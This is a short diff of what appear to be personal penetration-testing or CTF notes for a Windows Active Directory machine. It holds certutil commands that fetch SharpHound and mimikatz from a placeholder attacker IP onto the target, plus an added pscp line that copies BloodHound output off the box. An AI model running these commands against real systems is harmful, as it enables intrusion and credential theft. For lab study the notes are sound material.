@@ -19,6 +19,9 @@ DOWNLOAD THE FOLLOWING FILES. FOLLOW ALL OF THESE DOWNLOADS, GO FOR EASIEST WINS
  - certutil -urlcache -split -f http://<attacker-ip>/sharphound.exe sharp.exe -- Note: if ldap isn't enabled bloodhound output will suck.
  - certutil -urlcache -split -f http://<attacker-ip>/mimikatz.exe kity.exe
 
+
+ -pscp bd@ms01:/Users/web_svc/20250603155954_BloodHound.zip -- download from box
+
 Sharphound should hold all of the AD enumeration needed for this box.
 
 After winPEAS enum, and mimikatz, try this enum techniques.
